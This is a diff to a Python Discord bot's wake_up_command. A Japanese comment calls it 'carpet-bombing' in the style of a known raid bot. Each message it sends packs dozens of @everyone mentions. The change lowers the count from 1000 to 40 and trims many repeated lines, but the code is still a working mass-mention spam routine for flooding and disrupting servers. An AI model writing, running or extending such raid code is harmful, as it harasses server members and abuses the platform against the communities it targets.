@@ -265,7 +265,7 @@ async def wake_up_command(interaction: discord.Interaction):
 
     # 1つのメッセージに大量のメンションを詰め込む（おぜうBot風の絨毯爆撃スタイル）
     # ※文字列の長さに応じて、1回の送信に含まれる@everyoneの数を調整してください
-    spam_mentions = " ".join(["@everyone"] * 1000)
+    spam_mentions = " ".join(["@everyone"] * 40)
 
     wake_messages = [
         f"{spam_mentions}\n<@everyoneうおｗ",
@@ -273,7 +273,6 @@ async def wake_up_command(interaction: discord.Interaction):
         f"{spam_mentions}\n<@everyone",
         f"{spam_mentions}\n<@everyone",
         f"{spam_mentions}\n<@everyone>"
-                f"{spam_mentions}\n<@everyone>"
         f"{spam_mentions}\n<@everyone>"
         f"{spam_mentions}\n<@everyone>"
         f"{spam_mentions}\n<@everyone>"
@@ -319,60 +318,6 @@ async def wake_up_command(interaction: discord.Interaction):
         f"{spam_mentions}\n<@everyone>"
         f"{spam_mentions}\n<@everyone>"
         f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-        f"{spam_mentions}\n<@everyone>"
-
     ]
 
     image_url = "https://logo-imagecluster.img.mixi.jp/photo/comm/99/35/1429935_233.gif"
